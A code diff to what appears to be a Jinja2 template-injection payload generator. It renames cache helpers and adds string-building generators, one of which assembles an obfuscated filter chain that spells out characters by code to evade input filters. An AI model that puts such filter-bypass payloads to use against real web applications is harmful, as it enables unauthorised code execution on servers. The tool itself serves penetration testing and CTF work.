@@ -29,7 +29,7 @@ class PayloadGenerator:
             UNSATISFIED: self.unsatisfied_generate
         }
 
-    def add_cache(self, gen_type, *args, result=None):
+    def cache_add(self, gen_type, *args, result=None):
         try:
             # hash() might fail
             if (gen_type, *args) in self.cache:
@@ -37,6 +37,13 @@ class PayloadGenerator:
             self.cache[(gen_type, *args)] = result
         except Exception:
             return
+
+    def cache_has(self, gen_type, *args, result=None):
+        try:
+            # hash() might fail
+            return (gen_type, *args) in self.cache
+        except Exception:
+            return False
 
     def count_success(self, gen_type, req_gen_func_name):
         used_count[req_gen_func_name] += 1
@@ -69,7 +76,7 @@ class PayloadGenerator:
 
     def default_generate(self, gen_type: str, *args):
 
-        if self.cached_generate(gen_type, *args):
+        if self.cache_has(gen_type, *args):
             return self.cached_generate(gen_type, *args)
 
         if gen_type not in req_gens:
@@ -87,7 +94,7 @@ class PayloadGenerator:
             if not payload:
                 continue
             self.count_success(gen_type, req_gen_func.__name__)
-            self.add_cache(gen_type, *args, result=payload)
+            self.cache_add(gen_type, *args, result=payload)
             if gen_type in (INTEGER, STRING) and payload != str(args[0]):
                 logger.info("{great}, {gen_type}({args_repl}) can be {payload}".format(
                     great=colored("green", "Great"),
@@ -111,7 +118,7 @@ class PayloadGenerator:
             gen_type=gen_type,
             args_repl=", ".join(repr(arg) for arg in args),
         ))
-        self.add_cache(gen_type, *args, result=None)
+        self.cache_add(gen_type, *args, result=None)
         return None
 
     def generate(self, gen_type, *args):
@@ -760,6 +767,14 @@ def gen_string_concat2(context: dict, value: str):
 
 
 @req_gen
+def gen_string_concat3(context: dict, value: str):
+    return [
+        (LITERAL, "({})".format(
+            "".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
+        ))
+    ]
+
+@req_gen
 def gen_string_dictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [
@@ -867,6 +882,49 @@ def gen_string_formatfunc(context: dict, value: str):
     req.append(
         (LITERAL, "))")
     )
+    return req
+
+@req_gen
+def gen_string_formatfunc2(context: dict, value: str):
+    # (FORMAT(97,98,99))
+    # FORMAT = (CS.format)
+    # CS = (C*L)
+    if "{:c}" not in context.values():
+        return [
+            (UNSATISFIED, )
+        ]
+    k = [k for k, v in context.values() if v == "{:c}"][0]
+    cs = "({c}*{l})".format(
+        c = k,
+        l = len(value)
+    )
+    format_func = (ATTRIBUTE, (LITERAL, cs), "format")
+    req = [
+        (LITERAL, "("),
+        format_func,
+        (LITERAL, "("),
+        (LITERAL, ",".join(str(ord(c)) for c in value)),
+        (LITERAL, "))")
+    ]
+    return req
+
+@req_gen
+def gen_string_formatfunc3(context: dict, value: str):
+    # (FORMAT(97,98,99))
+    # FORMAT = (CS.format)
+    # CS = (C*L)
+    cs = "(({c})*{l})".format(
+        c = "{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)",
+        l = len(value)
+    )
+    format_func = (ATTRIBUTE, (LITERAL, cs), "format")
+    req = [
+        (LITERAL, "("),
+        format_func,
+        (LITERAL, "("),
+        (LITERAL, ",".join(str(ord(c)) for c in value)),
+        (LITERAL, "))")
+    ]
     return req
 
 # ---
